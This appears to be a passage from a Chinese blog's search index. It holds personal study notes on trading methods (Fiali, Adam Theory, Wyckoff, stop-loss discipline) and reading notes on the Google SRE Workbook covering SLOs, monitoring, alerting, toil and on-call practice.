计算（检查）支撑、阻力、高低点、T震荡指标；看别人分析报告，画线，标买卖点，做计划；主趋势向上还是向下？是否可能突破新高/低？T指标是多还是空？止损在哪？9:30-16:15 不停战斗！执行交易计划，算亏损18:00-22:30 画技术图，补画70支股票图形，标震荡指标，找拐点，研究价位，趋势线 114 菲阿里“四价”，奥卡姆剃刀，“黄药师”炭谷道孝起源14世纪教会哲学家、逻辑学家奥卡姆·威廉（William of Occam），面对“唯名论”和“唯实论”争议时，提出“如无必要，勿增实体”。 定义如果有两个假设相同的解释力和预测力，优先考虑最简洁的假设。 应用简洁就是最美的，最有效的！（iPhone、日本手工艺传承） 生活中的例子 学生各种原因迟到 懒 学生各种原因没带作业 没做 相亲 不合适：穷 没感觉：丑 一见钟情：帅 深思熟虑：有钱 目的 =&gt; 赚钱 =&gt; 正差价 =&gt; 买卖（多），卖买（空） =&gt; 价格 “扫地僧”菲阿里日本期货比赛冠军，收益10倍，第2次9倍《1000%的男人》 四价：昨高、昨低、昨收、今开 “扫地僧”菲阿里方法： 价格突破 开盘价突破 箱体顺大逆小 支撑与阻力处顺大逆小 “扫地僧”菲阿里心法： 一定要有止损或对冲套利 日内交易开始，大赚才隔夜，亏损不隔夜 总亏损不超过 1% 2% 市场不是数学公式，是反映人们的心理。不同人，资金不同，周期不同，面对同一张行情图多空完全不同 “黄药师”炭谷道孝方法： 价位突破（日本交易所每日6次公开喊价？集合竞价） 改进： 跌了就卖改到跌 -30 再卖（下跌需要更大的空间和力量而且反弹急） 涨了就买改到涨或平就买 除早盘第二节之外突破买（骗线，假突破） 尾盘 30 分钟交易法（利用收盘时间差） 必须大涨大跌 必须创新价 必须止损 同品种远期近期联动（对冲炒单） 开盘意外的高/低价 “黄药师”炭谷道孝心法（30年经验）： 日内交易：反人性，重系统，零和游戏，只有技巧高的人能赚 了解自己弱点，找到自己的方法，知道自己是哪种类型的人 不要预测行情，问“哪个商品会涨”的人最终赚不了钱 没有人亏，就不会有人赚，你只要不止损，就成了别人的猎物 你亏损，就是你能力不行，要勇于承认，并花更多时间去学习，不然就是来市场送钱的 进入市场是因为有欲望，但近来之后就会被欲望缠住脖子，而把自己勒死！能赚到钱的，不是会预测行情的人，而是会控制自己欲望的人！ 我在市场30年了，赚钱之道就是忍耐，控制亏损！ 115 苦从何来？我执+无常什么是苦？苦从何来？ 《一个农民的亿万传奇》（从5万到1.2亿） 傅海棠（先生）http://hy.eastmoney.com/zhuanti/2017cfgc/index3.html 苦 =&gt; 求之不得 =&gt; 我“执”（执着于“努力”、“上进”？还是执着于“无常”？） 放弃我执，面对无常 你最爱的人伤你最深！你最爱的“行情”（我执）伤你最深！ 臣服（市场，趋势）（当下） 参（禅） =&gt; 观察者，放下我执，承认无知 青泽老师 《澄明之境》 116 《亚当理论》（1）价值百万美元？亚当心法、惯性、翻转与中心对称人性（预测） 顺人性（确定性）江恩神奇数字波浪理论数浪百分比线缠论三买三卖指标 反人性（趋势跟随，不确定）趋势线均线箱体理论 《亚当理论》作者威尔斯·威尔德（Welles Wilder），技术分析之父（RSI、ATR、MOM等20多种）心法： 从事交易你不需要了解太多，比你看到的还要少（5岁小孩） 在市场中成功，我们必须投降（止损）（威廉1分钟内由多转空） 对有些事要视而不见，价格包含一切，包含供给与需求 避免武断（我执），方法：(1) 设每日止损 (2) 移动止盈 优秀的交易者会利用方向和持续期而非转折点 如果一个标的一直跌，我会卖到它跌到零位置；如果一直涨，我会买到涨到月球为止 我们关于市场所有的知识，最终会成为你成功的绊脚石！ 方法：来市场目的 =&gt; 赚钱 =&gt; 臣服市场 =&gt; 价格包含一切 =&gt; 趋势 什么是趋势？精确重复的事，惯性（物理惯性，行情惯性） 如何定位惯性？对称（中心对称，完美对称） 翻亚当开仓点（买入卖出）（翻转时机） 突破（高低点，时间长，波动大） 趋势改变（123法则） 缺口（跳空、高开、低开） 止盈点 翻过来高点 移动止盈 止损 前期低点 平仓的低点 加仓 金字塔加仓（3、2、1） 118 《亚当理论》（2）十大交易守则 亏损头寸绝不加码或摊平 建仓或加码都必须设止损 除非是朝着交易期望的方向，否则绝对不要取消或移动止损点 绝对不要让合理的小亏损变成大亏损，情况不对，立即出场 任何一笔或一天的交易，绝对不能让自己亏损10%以上（2%） 别去抓顶和底，让他们自己抓自己（走出来）（√）；亚当理论只会错一次，最终的顶和底的时候（×） 别挡在列车前面，如果市场往某个防线爆炸性发展，千万别做逆势交易，除非有明确的证据表明已经反转（是已经反转，不是将要反转） 你一定会出错，这是概率决定的，不要怕出错 交易不顺时，可以退场度假、休息，让头脑清醒 问问自己是否真想赚钱，然后仔细听自己内心答案 《有话好好说》张艺谋 119 《炒股的智慧》（1）交易必看书籍之一陈江挺（老师） 四个小故事： 年轻人（不要怕，不要悔） 小偷的故事 赌博与压庄的故事 沙丁鱼罐头（1块 =&gt; 1000块炒作，过期！）（真正的价值是市场愿意给的价格） 学股的四个阶段： 蛮干阶段：新手运（大亏暴亏得人，都有新手运） 摸索阶段：各种指标方法（迷宫理论） 体验风险：大赚，大亏，感情痛苦，不稳定 久赌必赢：用概率盈亏比去思考最后知行合一 121 《炒股的智慧》（2）为什么人性的弱点导致必然亏损？人性的弱点导致必然亏损 80% 人性不愿吃小亏，好占便宜 人性厌恶风险（1000块概率游戏） 发财心太急，别人暴富，认为自己也会，极易破产 人好自以为是（传统的知识，对错没有任何意义，无论你的价值判断如何科学，只要市场不认可，不要争辩） 人好跟风并推卸责任（听老王、专家、股评，然后错了可以把责任推掉） 人好因循守旧，喜欢稳定 人好报复，输了加倍 炒股技能太活，心态大于技术。过于聪明，选择太多。 122 《炒股的智慧》（3）最佳买卖点，遵循最小阻力，找临界点一、股票基本面分析 大环境：利率、税收、汇率、银根、通膨、政治 小环境：营收（资产负债表）、盈利（利润表）、固资、同行、品牌 预期：盈利增长、新产品、公司回购自己的股票 基本面定方向+技术面找买点 二、股票技术分析 趋势线判断涨跌平 支撑与阻力互换 双肩/头肩，双底/头肩底 均线（长期200日，短期50日） 周期 由“薄”到“厚” 形态、指标意义不大 三、股票具体买入点 突破点（N字形，W字形） 阻力与支撑互换时 头肩底突破 破底翻（2B） 四、股票具体卖出点 反着来 放量滞涨 巨量 移动止盈 危险信号，保本第一 及时止损 横有多长，竖有多高 124 躺着也能学外语？4国语言大人分享语言学习经验大脑学习模式专注模式，发散模式（旅游、音乐、美食、冥想） 四种学习方法： 转抽象为视觉、图像、空间 不断使用比喻（将未知转化为已知） 间隔化，重复练习、学习（记忆曲线） 流畅地解释给别人听（举出相似的例子） 外语学习方法 解决动机问题，必须从兴趣入手！（小说，电影，美食，体育，运动，量子物理，老司机，情感句子） 制作专属于自己的单词本（生活，工作，考试，恋爱） 千万不要“学”外语，从听力入手，先“听”外语（专注模式+发散模式）初级：小故事、笑话、美食、科幻、玄幻、言情中级：（相对）严谨的文章（量子物理）高级：小说 具体方法： 每天最少30分钟到1小时 找安静的地方 找脑波音乐、冥想音乐、水流音乐 同时听冥想音乐与外语，完全放松 深刻理解中西方语言的差异 中西语言发音部位不一样（胸腔发音，口腔发音） 中西语言句子结构完全不一样中国：河流结构（竹状结构）西方：树状结构 阴阳，姓数，动词变位必须配对，逻辑严密，如齿轮咬合 中外情景描述的差异中国：由外及内，由远及近，由大到小西方：由内到外，由近到远，由小到大 积木式组织句子 125 交易冠军菲阿里期货比赛实盘讲解（1）126 到底做短线还是长线？该少做还是多做？交易最像什么？误解：数学题推导，多劳多得，知识正解：拳击手，赛车手，杀手（狙击手），经验 知识+经验（实践）+概率（运气） 训练期：1分钟K线，只做日内，超短线，拼命做，投入资金&lt;10000以内 赚钱期：日内（少做，3分K，1分K），中长线（少做，60分K，4小时K） 赚钱期如何少做？ 只做标准图形，标准信号：2B、123、破底翻、WM、均线、KDJ、MACD、背离 深刻理解交易：不是按小时领工资！！交易时间+学习时间=工作时间 情绪（能量）损耗（可怕）：生活（远离垃圾人），交易 127 交易冠军菲阿里期货比赛实盘讲解（2）开盘价价位突破，高低点价位突破箱体顺大逆小，不同合约和品种对冲 128 《易经》乾坤卦 人生翻亚当《易经》乾卦上九：亢龙有悔九五：飞龙在天，利见大人九四：或跃在渊，无咎九三：君子终日乾乾，夕惕若厉，无咎九二：见龙在田，利见大人初九：潜龙勿用 坤卦上六：利永贞用六：龙战于野，其血玄黄……初九：履霜，坚冰至 四柱八字，大运流年 五行奇缺的人命运波折，但一旦遇上其大运、流年则大顺（成大事者必经历挫折期） 大运十年中（2年好运，2年差运，6年平运），一定要及时翻亚当！！ 131 交易冠军菲阿里期货比赛实盘讲解（5） 完结篇 技巧补充132 市场情绪与认知偏差交易是一种情绪！希望、恐惧、贪心、绝望 不确定的非理性：紧张，风险/概率，误判恐惧，不敢下单，让机会白白流走 理性：平缓，放松，开悟，解脱（从涨跌幻想中解脱出来） 结论：每个人身上都有一种根深蒂固的系统的、重复的非理性，市场（波动）也是由这些非理性造成的。（索罗斯反身性理论） 认知偏差： 损失厌恶：对避免损失由一种强烈的偏好。 沉没成本效应：更重视已花掉的钱，而不是未来可能亏得更多的钱。 处置效应：截断利润，让亏损奔跑。 结果偏好：根据决策结果判断好坏，而不考虑结果本身。 小数法则：从小概率中去找没有依据的结果，并且以为自己是小概率的幸运儿。 锚定效应：过于依赖所获得的信息。 潮流效应：盲目相信一件事，只因为很多人都相信它。 幸存者偏差：获得的信息不全面，“死人不会说话”。 133 威科夫交易法概述缺点： 太主观 取决于每个人分析能力 优点： 对于技术水平高的交易者，量价分析大大提高盈利概率 更接近市场的本质、核心 历史：Richard Wyckoff 1873-193415岁从报价员做起，25岁开办经纪公司，成立《华尔街杂志》（采访许多优秀的交易员），积累了大量财富 tape reading：盘口解读，逐笔分析成交/量价数据，量价背后（大资金）的意图，跟庄（跟着主力资金操作），识别（识别主力派发），根据主力收集派发加减仓 二元对立普通交易者、散户（业余，不学习，贪心），指标、财务、基本面消息、其他机构交易者（专业、有钱），供求（谁在买卖？有没有供应？需求？），吸筹区（在哪个区买？），派发区（在哪个区卖？），对手（其他机构成本区？），支撑与压力（筹码？量能？） 威科夫三大原理 供求原理：价格波动是由供应、需求数量决定的。 因果原理：凡事要有结果，首先要有原因，而且成正比。（有吸筹才有派发，趋势反转要派发完成） 努力和结果原理：任何一个行为都有力度相等的力（投入和产出原理）（量价要和谐统一，不统一时就要高度注意） 134 威科夫交易法（2）什么是供应与需求？供应扩大与需求扩大？支撑与阻力位的供应关系？ 硬核交易哲学，英国经验主义，洛克白板说论语《子贡问语》 培根：一切知识来源于经验 洛克：白板说感觉：外在经验，五感：身香味触感反省：内在经验，内在心理活动（痛苦、兴奋、悲伤） 经验 =&gt; 观念 =&gt; 知识：观念之间关系的认识简单观念：直接获得的，单纯的，被动的，不能制造，不能毁灭的被动接受的观念复杂观念：心灵加工，组合，比较后得到的观念（样式、实体、关系） 复杂观念都是自身契合心灵自己的产物，自己是原型！ 例子：同学聚会、老奶奶喝汤、蚂蚱三季 实战分析2019-03-17https://www.youtube.com/watch?v=g7VhrAIEDEI 2019-03-24https://www.youtube.com/watch?v=uXzgWahOibI 2019-03-31https://www.youtube.com/watch?v=BXWIWpQlIYo 2019-04-07https://www.youtube.com/watch?v=srIjxOdGb0k 2019-04-14https://www.youtube.com/watch?v=FYokzni8F4Y 2019-04-21https://www.youtube.com/watch?v=QQneY_UHwio 2019-04-28https://www.youtube.com/watch?v=r8tvh7el3aw 2019-05-07https://www.youtube.com/watch?v=chxmRvDjigM 2019-05-12https://www.youtube.com/watch?v=-bBVf7SgCjc 2019-05-19https://www.youtube.com/watch?v=7INA8nOyWk8 2019-05-26https://www.youtube.com/watch?v=1F2zRKG3O5U 2019-06-02https://www.youtube.com/watch?v=y03ghpqmcx4 2019-06-09https://www.youtube.com/watch?v=nria70G0-NM 2019-08-14https://www.youtube.com/watch?v=R2L8T-EF7lc&amp;t 2019-08-28 https://www.youtube.com/watch?v=YNdYVO061p0 2019-09-02 https://www.youtube.com/watch?v=u6_ad_qEE_g 分析行情前必须清楚 你做什么周期？日线？60分钟？30分钟？3分钟？高频？中短？长线？ 你的交易系统是什么？突破？动量？回调？箱体？极端衰竭的逆势？其他小技巧？ 你是否设置止损？小止损？大止损？ 你期待的盈亏比？止盈点在哪？ 对冲基金或者机构中，不同团队有不同的策略，可能A团队做多，B团队做空。但不同团队在同一天，面对同一种行情，都会赚钱，只是盈利多少，幅度大小而已。 预测行情永远 不是盈利的关键，等待属于自己的行情走出来，并坚定执行。开仓后坚定执行止盈或者止损，学会如何优化处理单子，才是关键。 2019-09-05 https://www.youtube.com/watch?v=AF1mqvSUSvg 2019-09-15 https://www.youtube.com/watch?v=vKJ220rd1dk 2019-09-23 https://www.youtube.com/watch?v=WMReMaOMSMY 2019-09-24https://www.youtube.com/watch?v=q4DY9GbYIyg 2019-09-30https://www.youtube.com/watch?v=_3xgM6v3Tzk 2019-10-22https://www.youtube.com/watch?v=52FoOq5am74 2019-10-26 https://www.youtube.com/watch?v=7rcCeLIuXo8 中央支持区块链狂欢，暴涨后如何分析？ 震荡交易法和突破交易法 震荡交易法优点：配合震荡指标，成功次数高，会有多次小盈利。如果是顺势震荡，还可以将小趋势变成大趋势。缺点：一旦转向，绝对不可以重仓或者加仓。 趋势交易法优点：一旦趋势形成，盈亏比极大。缺点：突破失败，必须第一时间砍仓。试错成本高。 开仓之前自查点 日线周线主要趋势是什么？我的交易方法？ 有没有概率发生反转？判断反转标志123法则，量价，缠论，背离，指标 河宽（量能累积）+盈亏比+胜率？ 止损点，止盈点？核心：我该承受多大损失？投入多大资金？ 2019-11-16 https://www.youtube.com/watch?v=HCL7x_B5iYM 2019-11-17 https://www.youtube.com/watch?v=d84GY_-xNl8","link":"/hexo-blog/2020/04/20/%E4%BA%91%E8%81%AA%E9%87%91%E8%9E%8D%E4%BA%A4%E6%98%93%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/"},{"title":"《Google SRE 工作手册》阅读笔记","text":"SRE 与 DevOps 的关系站点可靠性工程师（SRE）是 Google 工程副总裁 Ben Treynor Sloss 创造的术语。DevOps 是一种理念和工作方法，SRE 是 DevOps 的实现，比 DevOps 更具体、更清晰。 DevOps 核心思想 运维和开发团队不应该独立，各自为政，需要打穿部门墙。 意外不可避免，缺少保障措施才是问题。重心应该放在如何从故障中恢复，而不是防范故障的发生。 每次变更要尽量小，变更次数要尽量多。不应该为了提高效率或者为了“降低”风险，把变更积攒起来一起做。应该用正确的方式面对变更的风险，比如将其拆分为规模更小、风险也更小的变更，拼接起来形成一个前向稳定的变更序列，并在实施过程中不断优化变更流程，实现变更管理方式的转型。 自动化工具固然非常重要，但工程师文化更重要，良好的文化可以解决糟糕工具造成的麻烦，反之不然。 统一的度量是不同部门之间沟通的基石。 SRE 核心思想 做好运维是一个软件开发问题。SRE 应该使用软件工程的方法来解决问题。 不企图提供 100% 的可用性。应该以服务质量目标（SLO）为准绳，任何设计不应该违反 SLO。 尽量减少琐事，琐事不是工作。在运维任务上多花一分钟，在项目上就少了一分钟。虽然合理的运维任务可以更好地为设计系统提供信息，但是项目工作才能提高服务的可靠性和扩展性。 确定自动化目标（哪些需要自动化，什么条件下的自动化，如何自动化）。团队成员在琐事上花费的时间不能超过 50%。 减少常规故障平均修复时间（MTTR），会提升开发人员的迭代速度。 理想情况下 SRE 和产品团队都应该对技术栈有整体的了解（包括前端、后端、存储、内核、物理机），SRE 需要和产品团队共享服务的所有权。 负责同一个服务的不同团队应该使用相同的工具，这样优化工具的成本越小，收益更大。 SRE 与 DevOps 的异同共同点： 都认为实施改变是进步的源泉，没有改变就没有太大的操作空间。 都会在整个组织中广泛传播自己的理念，让不同团队之间的壁垒更容易打破。 少量多次地做变更，大部分变更应该经历自动化测试和自动部署。 都以数据为基础，指定统一的度量至关重要。 推行对事不对人的时候总结，避免毫无建设性的互相指责。 都希望通过共同合作使整个团队（组织、企业）变得更好，都会带来更快的迭代速度。 不同点： DevOps 是一种更宽泛的理念和文化，比 SRE 影响范围更广，在不同环境中有不同的具体表现，不太涉及操作层面的细节。 SRE 职责定义相对狭窄，面向服务而非面向整体业务。SRE 与 DevOps 所认可的东西相同，但认可的原因略有不同。 DevOps 与 SRE 理念带来收益的前提条件 不要把激励措施与发布和可靠性成果联系在一起。 避免组织层面的甩锅，应该积极鼓励工程师做变更，并授予其较高的自由度。同时推行对事不对人的总结报告。停止对一些无可救药的产品的支持，“如果总是给他们分配过多的运维工作，而飞起了他们的真材实料，可能就辞职不干了”。 是否需要将 SRE 岗位规划成一个新的组织架构或部门，取决于公司规模，但要认识到专业化带来的优势与挑战。 SRE 与开发团队的紧密合作，有助于在决策上可以达成一致的目标。 DevOps/SRE 团队与开发团队应该要得到同等的尊重与激励。 实施 SLO服务质量目标（Service Level Object，SLO），描述服务可靠性的程度，是 SRE 实践的核心。 SLO 的重要性SLO 是对可靠性工作的机会成本做出数据驱动型决策的关键，有利于合理安排可靠性工作的优先级。SRE 受 SLO 驱动：捍卫短期 SLO，并确保可以在中长期内对其进行持续维护。 SLO 入门 想要达到 100% 可靠性是一个错误的目标。 服务质量指标（Service Level Indicator，SLI）。建议将 SLI 视为两个数字的比率，比如成功实践数量/事件总数，范围是 0%-100%。SLO 就是目标的百分比数值，错误预算是 (100% - SLO)。 SLI 规范与 SLI 实现，可用性、延时，时效性、耐用性、正确性、质量和覆盖率都可以成为有价值的 SLO。 范例系统分析不同类型组件的潜在 SLI： 请求驱动： 可用性（返回结果为成功的请求的比例） 延迟（响应速度快于阈值的请求的比例） 质量（服务降级比例） 流水线 时效性（最近一次更新时间距现在小于某个时间阈值的数据的比例） 正确率（已进入流水线的数据记录，正确地生成了处理结果的比例） 覆盖率（处理了超过某些目标量级数据的作业的比例，或者在某个时间窗口内成功处理了传入记录的比例） 存储 持久性（写入记录可以被成功读取的比例） SLI 数据源：应用服务器日志、负载均衡器监控、黑盒监控、客户端嵌码 使用历史 SLI 数据得到初始 SLO 选择合适的时间窗口建议用周作为合适的时间窗口（周末流量高峰），防止长时间窗口更多的不确定性 获取所有利益干系者的认同宽松的 SLO 还是严谨的 SLO？ SRE 觉得劳民伤财 开发团队和产品经理觉得修复可靠性需要投入更多资源吗，导致发布速度降低至不能接受的程度 产品经理觉得是否让相当大量的用户感到崩溃 错误预算一旦耗尽： 开发团队需要找出与可靠性相关优先级最高的缺陷 开发团队需要专注于修复可靠性缺陷，暂缓外部特性开发需求 生产环境需要冻结，某些系统需要停止变更，知道错误预算恢复 SLO 和错误预算策略应该文档化。 SLO 报表：展示各个服务 SLO 是否达标以及 SLI 趋势。错误预算消耗图：展示某个服务错误预算消耗情况。 SLO 目标持续改进需要一个可以获取用户对服务满意度的信息源，比如： 公共论坛帖子、工单、客服热线，人工统计，得出服务中断次数 评估和分析社交媒体上用户情绪的宣泄（积极？消极？） 定期的用户满意度调查程序 面对面用户访谈调查采样 如果故障时间或工单数量陡增没有被 SLI 或 SLO 捕捉到，或 SLI 下降和 SLO 不达标没有反映出实际问题，就是 SLO 覆盖度低的表现，需要持续改进： 变更 SLO：放宽或收紧 变更 SLI 实现：将服务端指标移到 LB 或用户端 SLO 要符合现实：在满意度和成本之间妥协 迭代：时候评审 基于 SLO 和错误预算的决策SLO 决策矩阵 SLO 琐事 客户满意度 行动 达标 低 高 继续保持，或将重心转移到其他更需要可靠性的服务上 达标 低 低 收紧 SLO 达标 高 高 降低敏感度、放宽 SLO、提高自动化故障恢复（消除琐事） 达标 高 低 收紧 SLO 不达标 低 高 放宽 SLO 不达标 低 低 提高告警敏感度 不达标 高 高 放宽 SLO 不达标 高 低 提高自动化故障恢复（消除琐事） 进阶主题SLO 应该以改善用户体验为核心。SLI 的制定应该从用户行为出发。SLO 按用户等级（付费、免费）分组，按预期响应度（100ms、5s）分组。依赖服务的 SLO 也要考虑在整体 SLO 之内。对可用性进行可控的实验，可以挖掘 SLI 与用户满意度之间的关系。 SLO 工程案例研究Evernote 的 SLO 故事错误预算/SLO 模式可以促使开发和运维两个团队在相同的前提条件下做出相近的决定，因为 SRE 消除了对话中大量的主观性。 将实体数据中心迁移至公共云平台。导入 SLO，所有团队向 SLO 看齐。与云平台共享 SLO，目标对齐，共同担当成功或失败。 Home Depot 的 SLO 故事VALET Volume：容量（流量），服务可以处理多少业务量 Availability：可用性，服务是否在需要时可用 Latency：延迟，服务能否快速响应 Errors：服务是否会出错 Tickets：工单，服务请求是否需要人工干预才能完成 监控监控系统应该实现的目标 在需要人工接入的情况下，发出告警 调查或诊断这些问题 展示有关于系统的可视化信息 获取有关资源使用率或服务健康度的趋势分析，用于制定长期的规划 比较系统变更前后的行为，或者比较两个实验组的差距 监控系统的必备特性 数据获取速度，对事件作出响应的速度 计算，对监控指标做离线分析（周报，日报） 仪表盘（曲线图、热图、直方图、对数刻度表） 告警，告警抑制（多个节点同时触发告警，只需要发送一次；依赖的服务触发告警时，并不需要为自己的服务发出告警） 监控数据源（日志、指标、分布式追踪、运行态自查） 日志：优点精度高，缺点延时高 指标：缺点颗粒度低，优点实时性高 用指标来配置仪表盘和告警，用日志定位问题根本原因 将日志导出为指标，用于图表和告警 维护一个类库，集成到每个应用程序的框架语言中，在关键逻辑处调用来写入日志或导出指标。 告警触发后自动执行日志查询脚本，返回详细数据 管理监控系统 配置即代码（Configuration as Code）：将系统配置视为代码存储在 VCS 中。 保存了更改历史记录；把特定变更与任务跟踪系统（Jira）关联起来；易于回滚和语法语义检查；强化了代码评审流程的执行。 按意图配置的监控系统优于只提供 Web UI 或 CRUD API 的系统。 如果所有服务都能导出一组一致的基础指标，就可以在整个组织范围内自动化采集这些指标，并提供一致的仪表盘。 监控组件之间应该松耦合，确保稳定的监控接口。比如数据采集与规则计算（Prometheus）、长期时间序列存储（InfluxDB）、告警聚合（Alertmanager）、仪表盘（Grafana）。 度量指标的意图 SLI 指标应该放在最明显的位置上。 监控二进制文件的版本；监控命令行参数；监控动态配置的版本（或监控最新一次编译或打包的时间戳）。 监控直接依赖的服务的响应状态。 饱和度监控：当资源有硬性限制时；当超过阈值就会导致性能降级时。 服务流量（状态码以及速率配额限制监控） 用于告警还是用于排错。 测试告警逻辑通过仿真数据测试监控告警系统的正确性。 基于 SLO 的告警评估一条告警策略时，应该考虑： 精确率：告警事件中重大事件所占的比例 召回率：所有客观重大事件中，告警覆盖到的比例是多少 检测用时：在特定条件下发出告警通知需要多长时间 重置用时：问题解决之后告警还会持续多长时间 基于多个错误预算燃烧率发出告警 处理低流量服务的告警方法： 生成人工流量 组合多个服务 改变服务和基础设施，降低单个失败请求对用户的影响 降低 SLO，延长告警时间窗口 强烈建议不要为每个服务单独设定告警时间窗口和燃烧率参数。如果这样做，大量的琐事和各种特殊情况的具体分析工作会堆积如山。 根据相似可用性要求和阈值所设置的请求分组： 请求类别 可用性 延迟 p90 延迟 p99 举例 CRITICAL 99.99% 100ms 200ms 用户登录 HIGH_FAST 99.9% 100ms 200ms 浏览广告收入 HIGH_SLOW 99.9% 1000ms 5000ms 查看广告活动报告 LOW 99% 无 无 处理账户通知的轮询程序 NO_SLO 无 无 无 用户完全不可见的功能 消除琐事琐事的定义与维护服务相关的、重复发生的、可预测的、常规的任务流。 手动性、重复性、可自动化、非战术性/被动性、没有持久价值、与服务规模同步增长。 比如：当服务器上 /var/log 目录达到 95% 使用率的时候，工程师登录到机器，删除掉无用的日志文件。 时间一旦花在了琐事上，通常就没有用在批判性思考或表达创意力方面的时间了；削减琐事是对工程师人类智慧的认可，人类的判断和表达能力将在与之适合的领域中得到了更好地发挥。 通过消除琐事所节省的时间（至少）要与首次开发工作以及后续维护自动化解决方案所投入的时间成正比。 自动化工具潜在的收益 随着时间的推移和业务规模的增长，可以减少未来的琐事 提高团队士气，减少团队人员流失和透支的情况 降低上下文切换的中断，从而提高团队的工作效率 提高流程的清晰度和标准化 提高团队成员的技术水平和职业发展 更少的培训时间 减少人为错误导致的宕机 提高安全性 更短的用户请求响应时间 琐事来源业务流程举例：资源管理团队，管理着计算、存储、网络、负载均衡器、数据库，以及提供这些资源所需要的硬件。你的工作是负责处理新用户注册，配置他们的计算机并加固其安全性，执行软件更新，或者为调节集群容量而添加或删除服务器。最大限度地降低所使用资源的成本和浪费。通过工单方式与有需求的内部客户进行交互。 生产中断举例：手动释放磁盘空间，重新启动内存泄露的应用程序，提交工单更换硬盘驱动器。 产品发布举例：发布请求、回滚、紧急补丁、重复性或手动配置更改。 迁移数据存储、云供应商、源代码控制系统、应用程序库和工具的改变。 工程成本和容量规划 制定 CPU、内存、IOPS 等资源在未来的需求计划，可能转化为资源采购订单、公有云预留实例或合同谈判。 为关键的高流量时间开始和结束做准备，如产品发布或假期促销。 检查下游和尚有的服务水平/限制。 根据不同的服务规格优化工作负载（买一个高配虚拟机还是四个低配虚拟机？）。 根据云服务产品特有的计费希捷优化应用程序。 重构工具以更好地使用更便宜的竞价实例或可抢占式资源。 处理超额购买的资源。不透明架构的故障排查举例：分布式微服务架构故障排除工作需要登录到不同的系统或使用临时编写的日志分析工具。 琐事管理策略 采用数据驱动的方式识别琐事源头 尝试在源头上消灭琐事 拒绝琐事 根据 SLO 做出明确的决策 从半自动化开始 提供各种自助服务方法（表单、二进制、脚本、API，甚至文档） 获得管理层和同事的支持（通过拒绝新需求的方式保护员工免受打扰至关重要） 大力推广 不要试图设计一个没有琐事的完美系统。可以自动化一些高优先级的事情，再用节省下来的时间去做更多的改进。 设施统一化。团队可以自由选择自己的方法，但必须自己承担遗留系统所产生的琐事。 降低自动化带来的风险（防御性地处理用户输入，完整的安全检查，适时切换为人工处理） 使用开源和第三方工具（降低开发成本） 积极地收集反馈，不断进行改进 简单性简单性应该是 SRE 一个重要的目标，与可靠性密切相关。简单的软件不会经常发生故障，即是出了问题，修复起来也很快、也更容易。简单的系统更易于理解、维护和测试。 系统级复杂性的度量 培训时间（文档缺失或文档质量较低） 解释时间（架构图） 管理的多样性（配置文件集中存储还是分散在多个位置） 部署配置的多样性（生产环境有多少种独有的配置） 年龄（系统使用了多久） SRE 团队应该负责降低系统的复杂性，绘制系统的架构图是一个很好的开始，同时确保 SRE 参与评审所有的设计文档。我们要把成功的简化项目视为和发布新功能一样，并把添加代码和删除代码的功劳同等看待。 On-Call 值班On-Call 的目标是为重要的服务保驾护航，但不能为这个目标而牺牲工程师的健康。工程师需要有一系列应对流程和上报渠道。On-Call 工作应当有所补偿，比如提供额外的假期或不超过薪水一定比例的加班津贴，以激励参与 On-Call 的员工，也保证不会因为津贴过度参与 On-Call。 案例Google：组建一个新的团队编写工作清单： 管理生产工作 理解调试信息 把流量从一个特定集群上切出 回滚一次有问题的部署 拦截或限制非预期的流量 为服务扩容 使用监控系统（包括告警和仪表盘） 描述服务的系统架构、组成部分、依赖关系文档、代码示例、新手项目、即兴报告。排查告警，鼓励新人寻求帮助。与其他 SRE 团队和产品开发人员交流（视频会议、电子邮件、IRC），参与生产例会、阅读 On-Call 交接记录和事故总结、浏览已有服务文档。明确 On-Call 工程师准确的、具体的职责： 每次值班开始前，需要阅读上一位工程师的交接记录。 必须先降低对用户的影响，再研究如何彻底解决问题。 每次值班结束前，应当通过电子邮件的方式，将交接记录发给下一位工程师。维护 On-Call 工作手册，提供每个告警的严重性、影响范围、应对思路、处理方法。这些条目会减轻 On-Call 工程师的压力，缩短平均修复时间（MTTR），降低人为失误风险。 Evernote：从本地数据中心迁移至云数据中心重新定义告警规则，以 SLO 为目标，重点关注 API 响应状态，而不是 MySQL 某个指标。换句话说更关注用户在事故中的实际痛点，而不是在偶发的、短暂的问题上花费太多时间，这样才能给团队带来更多的睡眠、更高的收益，最终带来更高的工作满意度。 告警事件分类： P1：立即处理 应当立即采取行动 发出 On-Call 告警 展开事件诊断处理 判断对 SLO 的影响 P2：在下一个工作日内处理 一般不直接影响用户，或影响范围有限 向团队发送电子邮件，通知到相关频道 P3：仅供参考 在仪表盘上显示，必要时才发送电子邮件 包含容量规划相关信息 事故处理流程： 评估对用户造成的影响 事件升级 组织事故处理小组，启动事故管理流程 向事故负责人发送告警，选出联络员 处理事故 撰写事故报告，找出工具或流程上的缺陷 服务总结例会。 与 Google 用户可靠性工程师（CRE） 合作，与 CRE 共享 SLO。 用节省下来的时间将业务持续向前推进。 实施细节告警压力合理的响应时间： 事故描述 响应时间 对 SRE 要求 影响营收的网络故障 5 分钟 必须有一台电量充足、授权足够、网络通畅的电脑；不能出行；时刻与副 On-Call 保持联系 处理用户批量订单的系统卡住了 30 分钟 SRE 可以短暂离开或短暂通勤；副 On-Call 无需介入 一个预发布服务数据库备份故障 工单（工作时间内响应） 无 告警压力的来源：生产环境中的 bug、自动告警、人工变更操作 检查或预防未产生告警的旧 bug： 确保系统复杂性已达到最低 集成测试和单元测试 定期更新依赖库 定期进行破坏性测试和混沌测试 定期进行压力测试 避免发布中引入新 bug： 不断提高测试水平 尽量保持预发布环境和生产环境的一致性 金丝雀发布 对新 bug 保持较低的容忍度。遵循发现 bug、立即回滚、修复、再发布策略；而不是发现 bug、无视 bug、继续发布、修复。 防止人工误操作： 让所有生产环境的变更都由自动化系统根据（人开发的）配置文件实施 如何加速定位故障的根本原因： 优化告警和仪表盘 故障演练（“命运之轮”练习） 执行小批量发布 保留变更日志 请求帮助 缓解故障的措施： 回滚变更 特性开关 重定向用户请求 自动告警： 所有的告警都应当是可以立即处理的，应当有一系列处理步骤，人工可以立即操作，机器无法自动完成。 一切为 SLO 服务。 每个新的告警都应当被彻底、全面地评审，每个告警都应当有一条对应的工作手册条目。 要搞清楚每个告警背后的根本原因，如果找不到根本原因，就增加相应的监控和日志。不应该下结论说：“告警是由一个未知原因引起的”。 简单地修复一个眼前的 bug，会错失一个预防未来类似告警的黄金机会。 On-Call 